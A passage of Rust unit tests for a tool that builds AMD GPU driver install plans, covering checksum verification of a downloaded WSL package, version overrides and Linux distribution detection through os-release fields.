        let joined = plan.execution_commands().join("\n");
        assert!(!joined.contains("sudo "), "{joined}");
        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
        // And it must not demand a binary it no longer uses.
        assert!(!joined.contains("command -v sudo"), "{joined}");
        assert!(
            !plan
                .preflight_checks
                .iter()
                .any(|check| check.contains("`sudo` command is available")),
            "{:?}",
            plan.preflight_checks
        );
    }

    /// Runs the digest step the plan actually generates, rather than asserting
    /// that it contains some substrings.
    ///
    /// The step this exercises is the trust anchor for a root install, and the
    /// executable self-test that used to cover it was deleted along with
    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
    /// field-order or newline regression in the `printf | sha256sum -c -`
    /// fragment ship green, so the generated command is pinned whole with
    /// `assert_eq!` and then executed — with only the two values it embeds
    /// redirected at a test payload, so the quoting, spacing and field order
    /// under test are production's rather than a replica's.
    ///
    /// Field order in particular is invisible to a `starts_with`/`ends_with`
    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
    /// first breaks every real WSL install while still starting with
    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
    #[cfg(unix)]
    #[test]
    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
        use std::process::Command;

        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let version = plan.repo_version.clone();
        let pinned = ROCDXG_PINNED_DIGESTS
            .iter()
            .find_map(|(pinned_version, digest)| {
                (*pinned_version == version.as_str()).then_some(*digest)
            })
            .expect("the default version is pinned");
        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
        let generated = plan
            .execution_commands()
            .into_iter()
            .find(|c| c.contains("sha256sum -c -"))
            .expect("plan verifies the download");

        // Whole-string, not `contains`: the digest has to come first and the
        // two fields have to be separated by exactly the two spaces
        // `sha256sum -c -` expects.
        assert_eq!(
            generated,
            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
        );

        let (root, _paths) = test_paths("wsl-rocdxg-digest");
        fs::create_dir_all(&root).expect("test root");
        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");

        let digest_of = |path: &Path| -> String {
            let out = Command::new("sha256sum")
                .arg(path)
                .output()
                .expect("sha256sum runs");
            assert!(out.status.success());
            String::from_utf8(out.stdout)
                .expect("utf8")
                .split_whitespace()
                .next()
                .expect("digest field")
                .to_owned()
        };
        let good = digest_of(&payload);

        // The command under test is the generated one; the only edits are the
        // digest being checked and the path being checked, so a regression in
        // how the fragment is built reaches `sh` here instead of being masked
        // by a replica built to the test's own idea of the right shape.
        let step = |digest: &str| -> bool {
            let command = generated
                .replace(pinned, digest)
                .replace(&deb_path, &payload.display().to_string());
            Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("sh runs")
                .status
                .success()
        };

        assert!(step(&good), "the matching digest must pass");
        assert!(
            !step(&"0".repeat(64)),
            "a mismatched digest must fail the step"
        );
        assert!(!step("deadbeef"), "a malformed digest must fail the step");
        assert!(!step(""), "an empty digest must fail the step");

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn wsl_rocdxg_install_does_not_ask_for_a_reboot() {
        // ROCDXG is userspace: `ldconfig` publishes it in this boot. The
        // bare-metal DKMS path is the one that needs a reboot.
        let _env = scoped_rocdxg_env();
        let wsl = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(!wsl.reboot_required);
        let rendered = render_driver_install_plan(&wsl, false, false);
        // Anchor on the install step first: a refusal plan also reports
        // `reboot_required: false`, renders `post_install_checks:` from its
        // non-empty `checks`, and contains no `post_reboot` — so the three
        // assertions below hold against a plan that installs nothing at all.
        // Only a real install plan carries this command.
        assert!(
            rendered.contains("apt-get install -y '/tmp/"),
            "expected a real install plan, got:\n{rendered}"
        );
        assert!(rendered.contains("post_install_checks:"));
        assert!(!rendered.contains("post_reboot"));

        let bare_metal = build_driver_install_plan(
            &test_examine("linux", false),
            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
            true,
            PrivilegeEscalation::Sudo,
        );
        assert!(bare_metal.reboot_required);
        assert!(render_driver_install_plan(&bare_metal, false, false).contains("post_reboot"));
    }

    #[test]
    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
        // One resolved value drives the archive name, the release tag and the
        // download path, so an override cannot leave a URL pointing at the
        // default. The value is resolved at plan-build time rather than left as
        // a `${VAR:-default}` template, so the plan the user reviews names the
        // build the install will actually fetch.
        let mut env = scoped_rocdxg_env();

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert_eq!(plan.repo_version, "1.2.2");
        let commands = plan.execution_commands().join("\n");
        // The version is resolved here, not deferred to the shell: the plan the
        // user approves has to name the build the install will actually fetch.
        // No `${...}` expansion survives into the commands at all — the digest
        // is resolved at plan-build time too, which
        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
        // asserts by name.
        assert!(
            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
        );
        let occurrences = commands.matches("1.2.2").count();
        assert!(
            occurrences >= 3,
            "version should drive the deb name, the tag and the path; saw {occurrences}"
        );

        // An override has to reach every one of those references, including the
        // release URL — the bug this guards is a URL left on the default. The
        // digest comes along because an unpinned version is refused outright;
        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert_eq!(overridden.repo_version, "9.9.9");
        let commands = overridden.execution_commands().join("\n");
        assert!(
            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
            "{commands}"
        );
        assert!(
            commands.contains(
                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
            ),
            "{commands}"
        );
        assert!(
            !commands.contains("1.2.2"),
            "override left a reference on the default version:\n{commands}"
        );
    }

    // EAI-7406: distro selection must honor `/etc/os-release` `ID_LIKE`, so that
    // Debian/Ubuntu-family and RHEL-rebuild derivatives that share their base
    // version scheme are matched to the correct apt (`ubuntu/<codename>`) or EL
    // (`el/`) plan instead of falling through to the unsupported plan.

    #[test]
    fn driver_plan_ubuntu_derivative_via_id_like_matches_ubuntu_plan() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // Pop!_OS reports its own ID but reuses Ubuntu's version + repositories.
        let os_release = r#"
ID=pop
VERSION_ID="22.04"
VERSION_CODENAME=jammy
ID_LIKE="ubuntu debian"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(plan.mutating);
        assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
        // Ubuntu-family derivatives ship the Ubuntu kernel, so linux-modules-extra applies.
        assert!(rendered.contains("linux-modules-extra-$(uname -r)"));
        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
        assert!(rendered.contains("Execute: sudo apt-get install -y amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_debian_derivative_via_id_like_matches_debian_plan() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // A Debian derivative (e.g. LMDE) that shares Debian's version scheme.
        let os_release = r#"
ID=lmde
VERSION_ID="12"
ID_LIKE=debian
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        // Debian-family maps to the Ubuntu jammy repo and omits linux-modules-extra.
        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
        assert!(!rendered.contains("linux-modules-extra-$(uname -r)"));
        assert!(rendered.contains("amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_almalinux_via_id_like_uses_el_9_flow() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // AlmaLinux is a RHEL rebuild: standard kernel, served from the el/ path.
        let os_release = r#"
ID=almalinux
VERSION_ID="9.6"
ID_LIKE="rhel centos fedora"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(plan.mutating);
        assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
        // EL rebuilds use the vendor-neutral el/ repo path, not rhel/.
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.6/"));
        assert!(!rendered.contains("/rhel/9.6/"));
        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
        // el9 uses the version-aware standard-kernel prepare commands.
        assert!(rendered.contains("kernel-devel-matched-$(uname -r)"));
        assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_almalinux_8_via_id_like_uses_el_major_path() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=almalinux
VERSION_ID="8.10"
ID_LIKE="rhel centos fedora"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        // EL 8 is served from the major-version path (el/8), matching AMD docs.
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/8/"));
        assert!(rendered.contains("-1.el8.noarch.rpm"));
        // el8 has no kernel-devel-matched package.
        assert!(!rendered.contains("kernel-devel-matched"));
        assert!(rendered.contains("kernel-devel-$(uname -r)"));
    }

    #[test]
    fn driver_plan_id_like_with_unsupported_version_stays_unsupported() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // A Debian-family derivative whose VERSION_ID does not align with any
        // AMD-documented Debian version must not fabricate a plan.
        let os_release = r#"
ID=lmde
VERSION_ID="6"
ID_LIKE=debian
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(rendered.contains("unsupported_linux_dkms_plan"));
        assert!(!rendered.contains("amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_exact_id_takes_precedence_over_id_like() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // An exact RHEL match must keep the rhel/ path even though ID_LIKE=fedora.
        let os_release = r#"
ID=rhel
VERSION_ID="9.7"
ID_LIKE=fedora
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/rhel/9.7/"));
        assert!(!rendered.contains("/el/9.7/"));
    }

    #[test]
    fn driver_plan_oracle_linux_off_arm_version_stays_unsupported() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // Oracle Linux reports `ID_LIKE=fedora` (not rhel) and boots UEK. An OL
        // version outside the exact `ol` arm must NOT be captured by the EL
        // fallback, which would emit non-UEK kernel commands that cannot install.
        let os_release = r#"
ID=ol
VERSION_ID="9.6"
ID_LIKE=fedora
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(rendered.contains("unsupported_linux_dkms_plan"));
        assert!(!rendered.contains("kernel-devel-matched"));
        assert!(!rendered.contains("amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_opensuse_leap_stays_unsupported() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // openSUSE Leap shares SLES's version scheme but has no SUSEConnect/SCC
        // entitlement, so it must not be matched to the SLES plan.
        let os_release = r#"
ID=opensuse-leap
VERSION_ID="15.7"
ID_LIKE="suse opensuse"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(rendered.contains("unsupported_linux_dkms_plan"));
        assert!(!rendered.contains("SUSEConnect"));
        assert!(!rendered.contains("amdgpu-dkms"));
    }
}
